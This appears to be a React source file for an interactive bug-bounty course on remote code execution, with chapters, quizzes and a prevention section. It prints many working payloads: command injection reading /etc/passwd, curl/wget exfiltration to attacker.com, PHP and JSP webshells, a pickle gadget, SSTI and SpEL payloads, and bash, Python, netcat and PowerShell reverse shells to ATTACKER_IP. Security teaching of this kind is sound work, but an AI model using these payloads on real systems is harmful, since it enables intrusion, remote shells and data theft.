import React, { useState } from "react";
import { Link } from "react-router-dom";
import Navbar from "../../../components/Navbar/Navbar";
import "./RCE.css";

const chapters = [
  // ====================== 01 What is RCE? ======================
  {
    id: "what-is-rce",
    title: "01 What is RCE?",
    content: (
      <>
        <h2>What is Remote Code Execution (RCE)?</h2>
        <p>
          Remote Code Execution (RCE) is a critical vulnerability that allows
          an attacker to execute arbitrary code on a target server or system
          from a remote location. Successful RCE often leads to full system
          compromise, data theft, lateral movement, or ransomware deployment.
        </p>
        <p>
          RCE is considered one of the most severe vulnerabilities because it
          gives the attacker the ability to run commands or code with the
          privileges of the vulnerable application or service.
        </p>
        <h3>How RCE Works</h3>
        <ol>
          <li>Application accepts user-controlled input.</li>
          <li>Input reaches a dangerous function (command execution, eval, deserialization, template engine, etc.).</li>
          <li>Attacker crafts a payload that breaks out of the intended context.</li>
          <li>The server executes the attacker’s code or OS commands.</li>
          <li>Attacker gains a foothold (reverse shell, webshell, data exfiltration, etc.).</li>
        </ol>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            RCE = Forcing a remote server to execute attacker-controlled code
            or operating-system commands.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "Why is Remote Code Execution considered one of the most severe vulnerabilities?",
      options: [
        "It only affects the frontend UI",
        "It allows an attacker to execute arbitrary code on the server",
        "It only works on outdated browsers",
        "It can only read files, not execute them"
      ],
      correct: "It allows an attacker to execute arbitrary code on the server",
    },
  },

  // ====================== 02 Types of RCE ======================
  {
    id: "types",
    title: "02 Types of RCE",
    content: (
      <>
        <h2>Types of Remote Code Execution</h2>
        <h3>1. OS Command Injection</h3>
        <p>
          User input is passed to system shell functions (system, exec, popen,
          Runtime.exec, etc.) without proper sanitization.
        </p>
        <h3>2. Code Injection</h3>
        <p>
          User input is evaluated as code in the application language
          (eval, assert, create_function, etc.).
        </p>
        <h3>3. File Upload RCE</h3>
        <p>
          Uploading a malicious script (webshell) that the server later executes.
        </p>
        <h3>4. Deserialization RCE</h3>
        <p>
          Unsafe deserialization of attacker-controlled objects leads to
          code execution (Java, PHP, Python, .NET, etc.).
        </p>
        <h3>5. Server-Side Template Injection (SSTI)</h3>
        <p>
          Template engines evaluate user input as template code, allowing
          code execution.
        </p>
        <h3>6. Expression Language / OGNL / SpEL Injection</h3>
        <p>
          Injection into expression languages used by frameworks (Struts,
          Spring, etc.).
        </p>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Main RCE vectors: Command Injection, Code Injection, File Upload,
            Deserialization, SSTI, and Expression Language injection.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "Which of the following is a common type of RCE?",
      options: [
        "Only Cross-Site Scripting",
        "OS Command Injection and Server-Side Template Injection",
        "Only Clickjacking",
        "Only CSRF"
      ],
      correct: "OS Command Injection and Server-Side Template Injection",
    },
  },

  // ====================== 03 OS Command Injection ======================
  {
    id: "command-injection",
    title: "03 OS Command Injection",
    content: (
      <>
        <h2>OS Command Injection</h2>
        <p>
          Occurs when an application passes user-supplied data to a system
          shell without proper validation or escaping. The attacker can inject
          additional commands using shell metacharacters.
        </p>
        <h3>Dangerous Functions</h3>
        <ul>
          <li>PHP: <code>system()</code>, <code>exec()</code>, <code>shell_exec()</code>, <code>passthru()</code>, <code>popen()</code>, <code>proc_open()</code></li>
          <li>Python: <code>os.system()</code>, <code>os.popen()</code>, <code>subprocess</code> (with shell=True)</li>
          <li>Java: <code>Runtime.exec()</code>, <code>ProcessBuilder</code></li>
          <li>Node.js: <code>child_process.exec()</code>, <code>execSync()</code></li>
        </ul>
        <h3>Basic Payloads</h3>
        <pre className="payload-box">
{`; id
| id
|| id
& id
&& id
\`id\`
$(id)
%0aid`}
        </pre>
        <h3>Example Vulnerable Code (PHP)</h3>
        <pre className="payload-box">
{`<?php
  $ip = $_GET['ip'];
  system("ping -c 4 " . $ip);
?>`}
        </pre>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Command injection abuses shell metacharacters to chain additional
            OS commands when user input reaches system execution functions.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What is the root cause of OS Command Injection?",
      options: [
        "Using HTTPS",
        "Passing user input to system shell functions without proper sanitization",
        "Strong password policy",
        "Missing Content-Security-Policy"
      ],
      correct: "Passing user input to system shell functions without proper sanitization",
    },
  },

  // ====================== 04 Command Injection Payloads ======================
  {
    id: "command-payloads",
    title: "04 Command Injection Payloads",
    content: (
      <>
        <h2>Command Injection Payloads</h2>
        <h3>Command Separators</h3>
        <pre className="payload-box">
{`;           (Linux / Windows)
|           (pipe)
||          (OR)
&           (background / Windows)
&&          (AND)
\`command\`   (command substitution)
$(command)  (command substitution)
%0a         (newline)
%0d%0a      (CRLF)`}
        </pre>
        <h3>Basic Detection & Info</h3>
        <pre className="payload-box">
{`; id
| whoami
|| uname -a
& cat /etc/passwd
&& dir
\`id\`
$(whoami)`}
        </pre>
        <h3>Time-Based Detection</h3>
        <pre className="payload-box">
{`; sleep 5
| ping -c 5 127.0.0.1
|| timeout 5
& ping -n 5 127.0.0.1`}
        </pre>
        <h3>Out-of-Band (OOB)</h3>
        <pre className="payload-box">
{`; curl http://attacker.com/$(whoami)
| wget http://attacker.com/?x=$(id)
|| nslookup $(whoami).attacker.com`}
        </pre>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Use separators, command substitution, time delays, and OOB
            techniques to detect and exploit command injection.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "Which technique is useful for detecting command injection when there is no visible output?",
      options: [
        "Only changing the HTTP method",
        "Time-based delays (sleep) or Out-of-Band (OOB) requests",
        "Using only GET parameters",
        "Disabling JavaScript"
      ],
      correct: "Time-based delays (sleep) or Out-of-Band (OOB) requests",
    },
  },

  // ====================== 05 Code Injection ======================
  {
    id: "code-injection",
    title: "05 Code Injection",
    content: (
      <>
        <h2>Code Injection</h2>
        <p>
          Code injection occurs when user input is evaluated as code in the
          application’s programming language instead of being treated as data.
        </p>
        <h3>Dangerous Functions</h3>
        <ul>
          <li>PHP: <code>eval()</code>, <code>assert()</code>, <code>create_function()</code>, <code>preg_replace()</code> with /e</li>
          <li>Python: <code>eval()</code>, <code>exec()</code>, <code>compile()</code></li>
          <li>JavaScript/Node: <code>eval()</code>, <code>Function()</code>, <code>setTimeout(string)</code></li>
          <li>Ruby: <code>eval</code>, <code>send</code></li>
        </ul>
        <h3>Example Payloads (PHP)</h3>
        <pre className="payload-box">
{`';phpinfo();//
system('id');//
echo shell_exec('whoami');//`}
        </pre>
        <h3>Example Payloads (Python)</h3>
        <pre className="payload-box">
{`__import__('os').system('id')
eval("__import__('os').popen('id').read()")`}
        </pre>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Code injection abuses language evaluation features. Avoid eval-like
            functions and never pass user input to them.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "Which function is commonly dangerous and can lead to Code Injection in PHP?",
      options: [
        "echo()",
        "eval()",
        "strlen()",
        "htmlspecialchars()"
      ],
      correct: "eval()",
    },
  },

  // ====================== 06 File Upload RCE ======================
  {
    id: "file-upload-rce",
    title: "06 File Upload RCE",
    content: (
      <>
        <h2>File Upload to RCE</h2>
        <p>
          If an application allows unrestricted file uploads, an attacker can
          upload a webshell or script that the server later executes.
        </p>
        <h3>Common Webshells</h3>
        <pre className="payload-box">
{`<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['c']); ?>
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>`}
        </pre>
        <h3>Bypass Techniques</h3>
        <ul>
          <li>Double extensions: <code>shell.php.jpg</code>, <code>shell.php%00.jpg</code></li>
          <li>Case variation: <code>shell.pHp</code>, <code>shell.PhP</code></li>
          <li>Null byte (older systems): <code>shell.php%00.png</code></li>
          <li>Content-Type spoofing</li>
          <li>Magic bytes / polyglot files</li>
          <li>Path traversal in filename: <code>../shell.php</code></li>
        </ul>
        <h3>After Upload</h3>
        <p>
          Access the uploaded file directly or via LFI to trigger execution:
        </p>
        <pre className="payload-box">
{`https://target.com/uploads/shell.php?cmd=id
https://target.com/index.php?page=../uploads/shell`}
        </pre>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Unrestricted file upload + executable location = RCE. Always
            validate extension, content, and store files outside the web root.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What is required for a file upload vulnerability to lead to RCE?",
      options: [
        "The file must be larger than 10MB",
        "The uploaded file must be stored in a location where it can be executed by the server",
        "Only image files can cause RCE",
        "The server must be running Windows"
      ],
      correct: "The uploaded file must be stored in a location where it can be executed by the server",
    },
  },

  // ====================== 07 Deserialization RCE ======================
  {
    id: "deserialization",
    title: "07 Deserialization RCE",
    content: (
      <>
        <h2>Insecure Deserialization RCE</h2>
        <p>
          When an application deserializes untrusted data, an attacker can
          supply a malicious object that triggers code execution during
          deserialization or when the object is used.
        </p>
        <h3>Common Targets</h3>
        <ul>
          <li>Java – ObjectInputStream, Commons Collections, Spring, etc.</li>
          <li>PHP – unserialize()</li>
          <li>Python – pickle, yaml.load()</li>
          <li>.NET – BinaryFormatter, ObjectStateFormatter</li>
          <li>Ruby – Marshal.load</li>
        </ul>
        <h3>PHP Example</h3>
        <pre className="payload-box">
{`O:8:"stdClass":1:{s:4:"test";s:10:"phpinfo();";}
(or crafted gadget chains with magic methods __wakeup, __destruct, etc.)`}
        </pre>
        <h3>Python pickle</h3>
        <pre className="payload-box">
{`import pickle, os
class RCE:
    def __reduce__(self):
        return (os.system, ('id',))
pickle.dumps(RCE())`}
        </pre>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Never deserialize untrusted data. Prefer safe formats (JSON) and
            signed/encrypted serialization when needed.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What is the main risk of insecure deserialization?",
      options: [
        "Only data corruption",
        "Attacker-controlled objects can lead to remote code execution",
        "It only affects the client browser",
        "It improves performance"
      ],
      correct: "Attacker-controlled objects can lead to remote code execution",
    },
  },

  // ====================== 08 Server-Side Template Injection ======================
  {
    id: "ssti",
    title: "08 Server-Side Template Injection",
    content: (
      <>
        <h2>Server-Side Template Injection (SSTI)</h2>
        <p>
          SSTI occurs when user input is embedded into a server-side template
          and evaluated as template code, allowing code execution.
        </p>
        <h3>Detection</h3>
        <pre className="payload-box">
{`{{7*7}}
\${7*7}
<%= 7*7 %>
#{7*7}
{{config}}
{{self}}`}
        </pre>
        <h3>Jinja2 (Python) RCE</h3>
        <pre className="payload-box">
{`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}`}
        </pre>
        <h3>Twig (PHP)</h3>
        <pre className="payload-box">
{`{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}`}
        </pre>
        <h3>Freemarker / Velocity / Smarty</h3>
        <p>
          Each engine has its own syntax and gadget techniques to reach
          Runtime or ProcessBuilder.
        </p>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            SSTI turns template engines into code execution points. Detect with
            math expressions, then escalate to RCE using engine-specific gadgets.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "How do you usually detect Server-Side Template Injection?",
      options: [
        "By changing the User-Agent only",
        "By injecting mathematical expressions like {{7*7}}",
        "By uploading large files",
        "By using only POST requests"
      ],
      correct: "By injecting mathematical expressions like {{7*7}}",
    },
  },

  // ====================== 09 Expression Language Injection ======================
  {
    id: "expression-language",
    title: "09 Expression Language Injection",
    content: (
      <>
        <h2>Expression Language / OGNL / SpEL Injection</h2>
        <p>
          Many frameworks use expression languages (OGNL, SpEL, MVEL, EL) that
          can evaluate user input and lead to RCE if not properly restricted.
        </p>
        <h3>Apache Struts OGNL (classic)</h3>
        <pre className="payload-box">
{`%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)...}
(classic Struts2 RCE payloads)`}
        </pre>
        <h3>Spring Expression Language (SpEL)</h3>
        <pre className="payload-box">
{`T(java.lang.Runtime).getRuntime().exec('id')
#{T(java.lang.Runtime).getRuntime().exec('id')}`}
        </pre>
        <h3>Java EL</h3>
        <pre className="payload-box">
{`\${Runtime.getRuntime().exec('id')}
#{''.getClass().forName('java.lang.Runtime')...}`}
        </pre>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Expression Language injection is a frequent source of RCE in Java
            frameworks. Keep frameworks patched and avoid evaluating user input.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "Which frameworks are commonly affected by Expression Language injection leading to RCE?",
      options: [
        "Only frontend JavaScript frameworks",
        "Java frameworks like Apache Struts and Spring",
        "Only Python Django",
        "Only static HTML sites"
      ],
      correct: "Java frameworks like Apache Struts and Spring",
    },
  },

  // ====================== 10 Reverse Shells & Payloads ======================
  {
    id: "reverse-shells",
    title: "10 Reverse Shells & Payloads",
    content: (
      <>
        <h2>Reverse Shells & Common Payloads</h2>
        <p>
          After achieving command execution, attackers usually obtain an
          interactive shell.
        </p>
        <h3>Bash</h3>
        <pre className="payload-box">
{`bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'`}
        </pre>
        <h3>Python</h3>
        <pre className="payload-box">
{`python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`}
        </pre>
        <h3>PHP</h3>
        <pre className="payload-box">
{`php -r '$sock=fsockopen("ATTACKER_IP",443);exec("/bin/sh -i <&3 >&3 2>&3");'`}
        </pre>
        <h3>Netcat / BusyBox</h3>
        <pre className="payload-box">
{`nc ATTACKER_IP 443 -e /bin/sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 443 >/tmp/f`}
        </pre>
        <h3>PowerShell (Windows)</h3>
        <pre className="payload-box">
{`powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',443);..."`}
        </pre>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Reverse shells turn simple command execution into a full interactive
            session. Always use HTTPS/TLS listeners when possible.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What is the main purpose of a reverse shell after achieving RCE?",
      options: [
        "To make the website load faster",
        "To obtain an interactive shell on the target system",
        "To only read the robots.txt file",
        "To change the website theme"
      ],
      correct: "To obtain an interactive shell on the target system",
    },
  },

  // ====================== 11 RCE Hunting Methodology ======================
  {
    id: "hunting",
    title: "11 RCE Hunting Methodology",
    content: (
      <>
        <h2>RCE Hunting Methodology</h2>
        <h3>Step-by-Step Approach</h3>
        <ol>
          <li><strong>Map inputs</strong> – Parameters, headers, body, file uploads, cookies.</li>
          <li><strong>Identify sinks</strong> – Look for command execution, eval, template rendering, deserialization endpoints.</li>
          <li><strong>Test for injection</strong> – Command separators, math expressions (SSTI), serialized payloads.</li>
          <li><strong>Confirm execution</strong> – Time delays, OOB (DNS/HTTP), or visible output.</li>
          <li><strong>Escalate to shell</strong> – Reverse shell, webshell, or data exfiltration.</li>
          <li><strong>Assess impact</strong> – Privileges, access to secrets, lateral movement potential.</li>
          <li><strong>Document & report</strong> – Clear steps, payloads, and business impact.</li>
        </ol>
        <h3>Useful Tools</h3>
        <ul>
          <li>Burp Suite (Repeater, Intruder, Collaborator)</li>
          <li>Commix (command injection automation)</li>
          <li>ysoserial / phpggc / pickle tools (deserialization)</li>
          <li>tplmap (SSTI)</li>
          <li>Manual testing + OOB listeners</li>
        </ul>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Hunt systematically: find sinks → test injection → confirm with
            time/OOB → get shell → report impact.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What is the recommended first step when hunting for RCE?",
      options: [
        "Immediately send a reverse shell payload",
        "Map all inputs and identify dangerous sinks",
        "Only test file upload features",
        "Change the Content-Type header"
      ],
      correct: "Map all inputs and identify dangerous sinks",
    },
  },

  // ====================== 12 Useful RCE Payloads ======================
  {
    id: "payloads-cheatsheet",
    title: "12 Useful RCE Payloads",
    content: (
      <>
        <h2>Useful RCE Payloads Cheatsheet</h2>
        <h3>Command Injection</h3>
        <pre className="payload-box">
{`; id
| whoami
|| uname -a
& dir
&& cat /etc/passwd
\`id\`
$(whoami)
; sleep 5
| curl http://attacker.com/$(id)`}
        </pre>
        <h3>SSTI Detection</h3>
        <pre className="payload-box">
{`{{7*7}}
\${7*7}
<%= 7*7 %>
#{7*7}`}
        </pre>
        <h3>SSTI to RCE (Jinja2)</h3>
        <pre className="payload-box">
{`{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`}
        </pre>
        <h3>PHP Webshell</h3>
        <pre className="payload-box">
{`<?php system($_GET['cmd']); ?>
<?php echo passthru($_GET['c']); ?>`}
        </pre>
        <h3>Simple Reverse Shell</h3>
        <pre className="payload-box">
{`bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1'`}
        </pre>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            Keep a ready set of command injection, SSTI, webshell, and reverse
            shell payloads for quick testing and exploitation.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "Why is it useful to keep a payloads cheatsheet while hunting RCE?",
      options: [
        "To make the report longer",
        "For quick testing of common injection points and escalation",
        "Only for documentation purposes",
        "It is not useful"
      ],
      correct: "For quick testing of common injection points and escalation",
    },
  },

  // ====================== 13 RCE Prevention ======================
  {
    id: "prevention",
    title: "13 RCE Prevention",
    content: (
      <>
        <h2>How to Prevent RCE</h2>
        <ul>
          <li><strong>Never pass user input to system/exec/eval functions</strong>.</li>
          <li>Use parameterized APIs or safe libraries instead of shell commands.</li>
          <li>Validate and whitelist all input (especially file names and extensions).</li>
          <li>Store uploaded files outside the web root and serve them via controlled handlers.</li>
          <li>Disable dangerous functions (PHP disable_functions, etc.) when possible.</li>
          <li>Avoid insecure deserialization; use safe formats (JSON) and integrity checks.</li>
          <li>Keep frameworks, libraries, and template engines updated.</li>
          <li>Apply least privilege to the application process.</li>
          <li>Use Web Application Firewalls and runtime protection as additional layers.</li>
          <li>Implement proper Content Security Policy and secure coding standards.</li>
        </ul>
        <h3>Safe Alternatives</h3>
        <pre className="payload-box">
{`// Instead of system("ping " + ip)
// Use a library or restricted API that does not invoke a shell

// Instead of eval(userInput)
// Parse and handle data with safe parsers only`}
        </pre>
        <div className="info-box">
          <h4>Summary</h4>
          <p>
            The best defense is never to execute user-controlled data as code
            or OS commands. Prefer safe APIs, strict validation, and least privilege.
          </p>
        </div>
      </>
    ),
    quiz: {
      question: "What is the most important principle to prevent RCE?",
      options: [
        "Trust all user input",
        "Never pass user-controlled data to system/exec/eval functions",
        "Only use blacklists for extensions",
        "Disable HTTPS"
      ],
      correct: "Never pass user-controlled data to system/exec/eval functions",
    },
  },
];

const RCE = () => {
  const [activeChapter, setActiveChapter] = useState(chapters[0]);
  const [selectedOption, setSelectedOption] = useState("");
  const [showCongrats, setShowCongrats] = useState(false);
  const [completedChapters, setCompletedChapters] = useState([]);

  const handleSubmit = () => {
    if (!activeChapter.quiz) return;

    if (selectedOption === activeChapter.quiz.correct) {
      setShowCongrats(true);
      if (!completedChapters.includes(activeChapter.id)) {
        setCompletedChapters([...completedChapters, activeChapter.id]);
      }
    } else {
      alert("❌ Wrong answer. Try again!");
    }
  };

  const closeCongrats = () => {
    setShowCongrats(false);
    setSelectedOption("");
  };

  return (
    <div className="article-page">
      <Navbar />

      {/* ===== HEADER ===== */}
      <section className="article-header">
        <div className="article-header-content">
          <Link to="/bug-bounty" className="back-link">
            ← Back to Bug Bounty Courses
          </Link>
          <h1>
            The ultimate Bug Bounty guide to{" "}
            <span className="gradient-text">Remote Code Execution</span>
          </h1>
          <p className="article-date">Interactive Deep Course • 2026</p>
        </div>
      </section>

      {/* ===== BIG IMAGE ===== */}
      <section className="article-banner">
        <img
          src="https://plain-apac-prod-public.komododecks.com/202610/03/CzGI9ssKrxmNtimPFLzG/image.png"
          alt="RCE Guide"
          onError={(e) => {
            e.target.src =
              "https://via.placeholder.com/1200x420/1a0b2e/a855f7?text=Remote+Code+Execution";
          }}
        />
      </section>

      {/* ===== CONTENT ===== */}
      <section className="article-body">
        <div className="article-container">
          <aside className="article-sidebar">
            <h3>Course Content</h3>
            <ul>
              {chapters.map((chapter) => (
                <li
                  key={chapter.id}
                  className={`${activeChapter.id === chapter.id ? "active" : ""} ${
                    completedChapters.includes(chapter.id) ? "completed" : ""
                  }`}
                  onClick={() => {
                    setActiveChapter(chapter);
                    setSelectedOption("");
                  }}
                >
                  {chapter.title}
                  {completedChapters.includes(chapter.id) && (
                    <span className="check-mark">✓</span>
                  )}
                </li>
              ))}
            </ul>
          </aside>

          <div className="article-content">
            {activeChapter.content}

            {activeChapter.quiz && (
              <div className="quiz-box">
                <h3>Quick Check</h3>
                <p className="quiz-question">{activeChapter.quiz.question}</p>
                <div className="quiz-options">
                  {activeChapter.quiz.options.map((opt) => (
                    <label key={opt} className="quiz-option">
                      <input
                        type="radio"
                        name="quiz"
                        value={opt}
                        checked={selectedOption === opt}
                        onChange={(e) => setSelectedOption(e.target.value)}
                      />
                      <span>{opt}</span>
                    </label>
                  ))}
                </div>
                <button className="quiz-submit" onClick={handleSubmit}>
                  Submit Answer
                </button>
              </div>
            )}
          </div>
        </div>
      </section>

      {showCongrats && (
        <div className="congrats-overlay">
          <div className="congrats-modal">
            <div className="congrats-icon">🎉</div>
            <h2>Congratulations!</h2>
            <p>You completed this step successfully.</p>
            <button onClick={closeCongrats}>Continue Learning</button>
          </div>
        </div>
      )}
    </div>
  );
};

export default RCE;